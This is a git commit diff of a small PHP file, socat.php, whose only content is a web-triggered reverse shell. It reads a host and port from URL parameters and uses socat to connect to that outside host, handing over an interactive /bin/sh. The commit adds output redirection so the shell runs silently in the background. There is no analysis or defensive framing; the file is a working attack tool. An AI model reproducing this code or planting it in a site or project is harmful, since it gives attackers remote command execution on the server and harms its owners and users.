801bfd8c85e39088d20cb436893446e6a7de1a02
laiyuantemp <100673133+laiyuantemp@users.noreply.github.com>
2022-08-16 14:20:04 +0800

    Update socat.php

--- socat.php
+++ socat.php
@@ -1,4 +1,4 @@
 <?php
-  exec('socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/sh,pty,stderr,setsid,sigint,sane &');
+  exec('socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/sh,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &');
 ?>
 request sent
